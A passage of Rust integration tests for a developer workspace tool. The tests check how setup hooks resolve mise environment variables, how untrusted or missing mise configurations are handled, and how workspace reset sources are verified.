        .unwrap();
        assert_eq!(
            again.status,
            Status::Ready,
            "{name}: {:?}",
            again.receipt.phases
        );
        assert_eq!(seen(&out.workspace).as_deref(), Some(MAIN), "{name}");
        assert!(again.receipt.mise_check_skipped_at.is_some(), "{name}");
        assert!(
            again
                .warnings
                .iter()
                .any(|w| w.contains("skipped on request")),
            "{name}: {:?}",
            again.warnings
        );
        let stored = receipt_of(&out.workspace);
        assert!(stored.mise_check_skipped_at.is_some(), "{name}");
    }
}

#[test]
fn a_hook_routed_through_devflow_exec_runs_whatever_mise_sets() {
    // The generated shape: `mise exec -- devflow exec -- CMD`. devflow sets
    // the workspace's variables after mise, so no check is needed and the
    // command gets the workspace's own value, from a subdirectory too.
    const NAME: &str = "a_hook_routed_through_devflow_exec_runs_whatever_mise_sets";
    if !with_real_mise(NAME) {
        return;
    }
    for (hook, files) in [
        (ROUTED, vec![]),
        (
            "cd app && mise exec -- devflow exec -- sh ../seen.sh",
            vec![(
                "app/mise.toml",
                "[env]\nCOMPOSE_PROJECT_NAME = \"main-app\"\n",
            )],
        ),
    ] {
        let t = project_with_hook(hook, "", &files);
        // Everything that could override it does.
        commit_mise(
            &t,
            "[env]\n_.file = \".env\"\n",
            &[("mise.local.toml", "[env]\nCOMPOSE_PROJECT_NAME = false\n")],
        );
        let out = create(&t.project, "w", no_db(&t.project)).unwrap();
        assert_eq!(
            out.status,
            Status::Ready,
            "{hook}: {:?}",
            out.receipt.phases
        );
        let expected = env_map(&out.workspace)["COMPOSE_PROJECT_NAME"].clone();
        assert_ne!(expected, MAIN);
        assert_eq!(seen(&out.workspace), Some(expected), "{hook}");
        assert!(out.receipt.mise_check_skipped_at.is_none());
        assert!(out.warnings.is_empty(), "{hook}: {:?}", out.warnings);
    }
}

#[test]
fn review_final_c_a_generated_mise_env_selects_other_configuration() {
    // `[env] MISE_ENV = "production"` is injected into the hook, so
    // `mise exec` reads `mise.production.toml`. A check made without it
    // would have passed.
    const NAME: &str = "review_final_c_a_generated_mise_env_selects_other_configuration";
    if !with_real_mise(NAME) {
        return;
    }
    let production = (
        "mise.production.toml",
        "[env]\nCOMPOSE_PROJECT_NAME = \"main-production\"\n",
    );
    // Without MISE_ENV the file is not read.
    let t = project_with_hook(THROUGH_MISE, "", &[production]);
    commit_mise(&t, WIRED, &[]);
    let out = create(&t.project, "plain", no_db(&t.project)).unwrap();
    assert_eq!(out.status, Status::Ready, "{:?}", out.receipt.phases);
    // With it, it is, and the hook is not run.
    let t = project_with_hook(
        THROUGH_MISE,
        "[env]\nMISE_ENV = \"production\"\n",
        &[production],
    );
    commit_mise(&t, WIRED, &[]);
    let out = create(&t.project, "selected", no_db(&t.project)).unwrap();
    assert_eq!(out.status, Status::NeedsAttention);
    let detail = hooks_record(&out).detail.unwrap();
    assert!(
        detail.contains("mise resolves COMPOSE_PROJECT_NAME")
            && !detail.contains("main-production"),
        "{detail}"
    );
    assert_eq!(seen(&out.workspace), None);
    // Routed through devflow exec, it runs, and gets the workspace's value.
    let t = project_with_hook(ROUTED, "[env]\nMISE_ENV = \"production\"\n", &[production]);
    commit_mise(&t, WIRED, &[]);
    let out = create(&t.project, "routed", no_db(&t.project)).unwrap();
    assert_eq!(out.status, Status::Ready, "{:?}", out.receipt.phases);
    assert_eq!(
        seen(&out.workspace),
        Some(env_map(&out.workspace)["COMPOSE_PROJECT_NAME"].clone())
    );
}

#[test]
fn review_final_d_configuration_in_places_a_short_list_of_names_misses() {
    // No `mise.toml` at all: only `.config/mise/conf.d/a.toml`, or
    // `.config/mise/config.dev.toml` with MISE_ENV=dev. A check that began
    // with a list of file names did not run for these worktrees.
    const NAME: &str = "review_final_d_configuration_in_places_a_short_list_of_names_misses";
    if !with_real_mise(NAME) {
        return;
    }
    let overriding = "[env]\nCOMPOSE_PROJECT_NAME = \"main-elsewhere\"\n";
    for (label, extra, file) in [
        ("conf.d", "", ".config/mise/conf.d/a.toml"),
        (
            "environment-specific",
            "[env]\nMISE_ENV = \"dev\"\n",
            ".config/mise/config.dev.toml",
        ),
    ] {
        let t = project_with_hook(THROUGH_MISE, extra, &[(file, overriding)]);
        let out = create(&t.project, "w", no_db(&t.project)).unwrap();
        assert_eq!(out.status, Status::NeedsAttention, "{label}");
        let detail = hooks_record(&out).detail.unwrap();
        assert!(
            detail.contains("mise resolves COMPOSE_PROJECT_NAME")
                && detail.contains("setup hook #1"),
            "{label}: {detail}"
        );
        assert_eq!(seen(&out.workspace), None, "{label}");
    }
}

#[test]
fn review_final_e_a_variable_removed_by_mise_is_not_let_through() {
    // `[env] NAME = false` without loading `.devflow/env`: `mise env` shows
    // nothing (the file is not loaded, so the old check only warned), and
    // `mise exec` removes the variable devflow injected.
    const NAME: &str = "review_final_e_a_variable_removed_by_mise_is_not_let_through";
    if !with_real_mise(NAME) {
        return;
    }
    let t = project_with_hook(THROUGH_MISE, "", &[]);
    commit_mise(&t, "[env]\nCOMPOSE_PROJECT_NAME = false\n", &[]);
    let out = create(&t.project, "w", no_db(&t.project)).unwrap();
    assert_eq!(out.status, Status::NeedsAttention);
    let detail = hooks_record(&out).detail.unwrap();
    assert!(
        detail.contains("mise removes COMPOSE_PROJECT_NAME") && detail.contains("devflow exec"),
        "{detail}"
    );
    assert_eq!(seen(&out.workspace), None);
}

#[test]
fn review_final_a_and_b_hooks_the_check_cannot_stand_for_warn_instead_of_blocking() {
    // (a) `cd app && mise exec -- …` where `app/mise.toml` sets the main
    // database, and (b) a mise task whose own `env` sets it: the hook runs
    // and gets the main value, because a check at the worktree root cannot
    // tell. The gate says so, by hook, and recommends `devflow exec`.
    const NAME: &str =
        "review_final_a_and_b_hooks_the_check_cannot_stand_for_warn_instead_of_blocking";
    if !with_real_mise(NAME) {
        return;
    }
    for (label, hook, files, reason) in [
        (
            "a",
            "cd app && mise exec -- sh ../seen.sh",
            vec![
                (
                    "app/mise.toml",
                    "[env]\nCOMPOSE_PROJECT_NAME = \"main-app\"\n",
                ),
                ("mise.toml", WIRED),
            ],
            "changes directory before mise",
        ),
        (
            "b",
            "mise run seen",
            vec![(
                "mise.toml",
                "[env]\n_.file = \".devflow/env\"\n\n[tasks.seen]\nrun = \"sh seen.sh\"\n\n\
                 [tasks.seen.env]\nCOMPOSE_PROJECT_NAME = \"main-task\"\n",
            )],
            "runs a mise task",
        ),
    ] {
        let t = project_with_hook(hook, "", &files);
        let out = create(&t.project, "w", no_db(&t.project)).unwrap();
        assert_eq!(
            out.status,
            Status::Ready,
            "{label}: {:?}",
            out.receipt.phases
        );
        let warning = out
            .warnings
            .iter()
            .find(|w| w.contains("setup hook #1"))
            .unwrap_or_else(|| panic!("{label}: {:?}", out.warnings));
        assert!(
            warning.contains(reason) && warning.contains("devflow exec"),
            "{label}: {warning}"
        );
        assert!(
            !warning.contains("seen") && !warning.contains("app &&"),
            "no command text: {warning}"
        );
        // The hole is real: the hook got another value.
        assert_ne!(
            seen(&out.workspace),
            Some(env_map(&out.workspace)["COMPOSE_PROJECT_NAME"].clone()),
            "{label}"
        );
    }
}

#[test]
fn a_configuration_mise_does_not_trust_stops_the_hooks_and_is_never_trusted_for_the_user() {
    const NAME: &str =
        "a_configuration_mise_does_not_trust_stops_the_hooks_and_is_never_trusted_for_the_user";
    if std::env::var_os(CHILD).is_none() && !mise_installed() {
        eprintln!("skipped: mise is not installed");
        return;
    }
    let base = tempfile::tempdir().unwrap();
    let base_path = base.path().canonicalize().unwrap();
    std::fs::create_dir_all(base_path.join("tmp")).unwrap();
    // Trust covers some other directory: the repository is not trusted.
    let mut env = isolated_mise(&base_path);
    let elsewhere = base_path.join("elsewhere");
    std::fs::create_dir_all(&elsewhere).unwrap();
    for (key, value) in &mut env {
        if key == "MISE_TRUSTED_CONFIG_PATHS" {
            *value = elsewhere.display().to_string();
        }
    }
    let env: Vec<(&str, &str)> = env.iter().map(|(k, v)| (k.as_str(), v.as_str())).collect();
    if !in_child(NAME, &env) {
        return;
    }

    let t = project_with_hook(THROUGH_MISE, "", &[]);
    commit_mise(&t, WIRED, &[]);
    let out = create(&t.project, "w", no_db(&t.project)).unwrap();
    let hooks = hooks_record(&out);
    assert_eq!(out.status, Status::NeedsAttention, "{hooks:?}");
    let detail = hooks.detail.unwrap();
    assert!(detail.contains("mise trust "), "{detail}");
    assert!(
        detail.contains(&out.workspace.path.display().to_string()),
        "{detail}"
    );
    assert_eq!(seen(&out.workspace), None);
    // devflow trusted nothing on its own: mise still refuses it.
    let trust_state = std::process::Command::new("mise")
        .args(["trust", "--show"])
        .current_dir(&out.workspace.path)
        .output()
        .unwrap();
    assert!(
        String::from_utf8_lossy(&trust_state.stdout).contains("untrusted"),
        "{}",
        String::from_utf8_lossy(&trust_state.stdout)
    );
}

#[test]
fn a_missing_mise_stops_only_the_setup_hooks_that_run_it() {
    const NAME: &str = "a_missing_mise_stops_only_the_setup_hooks_that_run_it";
    // A PATH without mise (and without anything but the system tools).
    if ["/usr/bin/mise", "/bin/mise"]
        .iter()
        .any(|p| Path::new(p).exists())
    {
        eprintln!("skipped: mise is installed in a system directory");
        return;
    }
    if !in_child(NAME, &[("PATH", "/usr/bin:/bin")]) {
        return;
    }
    for (hook, blocked) in [
        ("echo ran >> .devflow/runs", false),
        ("mise exec -- true", true),
    ] {
        let t = repo(
            &Hooks {
                setup: &[hook, "echo second >> .devflow/runs"],
                ..Default::default()
            },
            "",
        );
        trust::approve(&t.project).unwrap();
        commit_mise(&t, "[tools]\n", &[]);
        let out = create(&t.project, "w", no_db(&t.project)).unwrap();
        let record = out.receipt.phase(Phase::Hooks);
        if blocked {
            assert_eq!(out.status, Status::NeedsAttention, "{hook}: {record:?}");
            assert!(
                record.detail.unwrap().contains("mise is not installed"),
                "{hook}"
            );
            assert!(!out.workspace.path.join(".devflow/runs").exists());
        } else {
            assert_eq!(out.status, Status::Ready, "{hook}: {record:?}");
            assert_eq!(
                std::fs::read_to_string(out.workspace.path.join(".devflow/runs"))
                    .unwrap()
                    .lines()
                    .count(),
                2
            );
        }
    }
}

// --- the identity a reset is shown with ---------------------------------------

#[test]
fn a_reset_source_is_an_identity_and_a_name_that_moved_is_refused() {
    use devflow_core::config::Engine;
    use devflow_core::error::WorkspaceChanged;
    use devflow_core::receipt::CloneReport;
    use devflow_core::services::catalog::{
        BranchRecord, Catalog, ServiceCatalog, SnapshotRecord, SourceRef, Store, VERSION,
    };
    use devflow_core::setup::BranchExpect;
    use serde_json::json;
    use uuid::Uuid;

    let t = repo(&Hooks::default(), "[services.cache]\nengine = \"valkey\"\n");
    let git = git2::Repository::open(&t.root).unwrap();
    for name in ["target", "other"] {
        git.worktree(name, &t._dir.path().join(name), None).unwrap();
    }
    let (target, other) = (ws(&t.project, "target"), ws(&t.project, "other"));
    let when = "2026-10-11T09:00:00Z";
    let branch = |id: Uuid, name: &str, owner: Uuid| -> BranchRecord {
        serde_json::from_value(json!({
            "id": id, "name": name, "owner": owner, "state": "ready",
            "container_name": format!("c-{name}"), "volume": format!("v-{name}"),
            "image": "valkey/valkey:8-alpine", "pin": "valkey/valkey@sha256:1",
            "password": "pw", // kingfisher:ignore
            "source": { "kind": "empty" }, "generation": 1,
            "created_at": when, "updated_at": when,
        }))
        .unwrap()
    };
    let snapshot = |id: Uuid, version: u32| -> SnapshotRecord {
        serde_json::from_value(json!({
            "id": id, "name": "seed", "version": version, "state": "ready",
            "volume": format!("s-{version}"), "source": { "kind": "empty" },
            "image": "valkey/valkey:8-alpine", "pin": "valkey/valkey@sha256:1",
            "created_at": when,
        }))
        .unwrap()
    };
    let bind = |ws: &Workspace, instance: Uuid, branch: Uuid| {
        let mut receipt = Receipt::new(t.project.id(), &ws.name, None);
        receipt.instance_id = instance;
        receipt.services.insert(
            "cache".into(),
            ServiceBinding::container(
                Engine::Valkey,
                branch,
                "redis://:pw@127.0.0.1:6381/0".into(), // kingfisher:ignore
                None,
                "empty".into(),
                CloneReport {
                    method: None,
                    captured_at: None,
                    allocated_bytes: None,
                    source_downtime_ms: None,
                },
                None,
            ),
        );
        receipt.save(&ws.git_dir).unwrap();
    };
    let (own_instance, old_instance, new_instance) =
        (Uuid::new_v4(), Uuid::new_v4(), Uuid::new_v4());
    let (own, old, new) = (Uuid::new_v4(), Uuid::new_v4(), Uuid::new_v4());
    let (seed1, seed2) = (Uuid::new_v4(), Uuid::new_v4());
    let write_catalog = |branches: Vec<BranchRecord>| {
        let mut records = ServiceCatalog::new(Engine::Valkey);
        records.branches = branches;
        records.snapshots = vec![snapshot(seed1, 1), snapshot(seed2, 2)];
        let catalog = Catalog {
            version: VERSION,
            project_id: t.project.id(),
            docker: "daemon".into(),
            services: [("cache".to_string(), records)].into(),
        };
        let path = Store::path_for(t.project.id()).unwrap();
        std::fs::create_dir_all(path.parent().unwrap()).unwrap();
        std::fs::write(&path, serde_json::to_vec(&catalog).unwrap()).unwrap();
    };

    // The dialog is drawn: `other` holds `old`.
    bind(&target, own_instance, own);
    bind(&other, old_instance, old);
    write_catalog(vec![
        branch(own, "target", own_instance),
        branch(old, "other", old_instance),
    ]);
    let from_other = DataSource::Workspace {
        name: "other".into(),
    };
    let shown = setup::reset_source(&t.project, &target, "cache", Some(&from_other)).unwrap();
    assert_eq!(shown.source, SourceRef::Branch { id: old });
    assert_eq!(shown.label, "workspace:other");
    let snapshot_v1 = DataSource::Snapshot {
        name: "seed".into(),
        version: Some(1),
    };
    let seed = setup::reset_source(&t.project, &target, "cache", Some(&snapshot_v1)).unwrap();
    assert_eq!(seed.source, SourceRef::Snapshot { id: seed1 });
    // The recorded source is the branch's own provenance.
    let recorded = setup::reset_source(&t.project, &target, "cache", None).unwrap();
    assert_eq!(recorded.source, SourceRef::Empty);
    // A workspace is not a source for itself.
    let itself = DataSource::Workspace {
        name: "target".into(),
    };
    assert!(setup::reset_source(&t.project, &target, "cache", Some(&itself)).is_err());

    let expect = BranchExpect {
        instance: own_instance,
        branch: own,
        source: Some(shown.source),
    };
    expect
        .verify_source(&target, "cache", shown.source)
        .unwrap();

    // `setup --new-instance` runs in `other` before the confirmation.
    bind(&other, new_instance, new);
    write_catalog(vec![
        branch(own, "target", own_instance),
        branch(old, "other", old_instance),
        branch(new, "other", new_instance),
    ]);
    let now = setup::reset_source(&t.project, &target, "cache", Some(&from_other)).unwrap();
    assert_eq!(now.source, SourceRef::Branch { id: new });
    let error = expect
        .verify_source(&target, "cache", now.source)
        .unwrap_err();
    let changed = error
        .downcast_ref::<WorkspaceChanged>()
        .unwrap_or_else(|| panic!("not the typed error: {error:#}"));
    assert_eq!(
        (changed.workspace.as_str(), changed.service.as_str()),
        ("target", "cache")
    );
    assert!(
        error.to_string().contains("changed since you reviewed it"),
        "{error}"
    );
    assert!(error.to_string().contains(&old.to_string()), "{error}");
    // A request that pinned nothing (the CLI) takes whatever resolves now.
    BranchExpect {
        source: None,
        ..expect
    }
    .verify_source(&target, "cache", now.source)
    .unwrap();
}
